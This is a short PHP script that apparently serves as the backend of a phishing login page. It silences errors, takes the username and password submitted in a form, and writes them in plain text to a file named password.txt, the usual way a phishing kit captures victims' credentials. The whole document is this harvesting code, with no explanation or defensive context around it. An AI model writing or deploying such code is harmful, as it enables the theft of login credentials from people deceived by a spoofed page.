<?php
error_reporting(0);
$username=$_POST['username'];
$password=$_POST['password'];
if (isset($_POST['button'])) {
  $opn=fopen('password.txt', 'w');
  fwrite($opn, $username);
  fwrite($opn, ":");
  fwrite($opn, $password);
}
?>
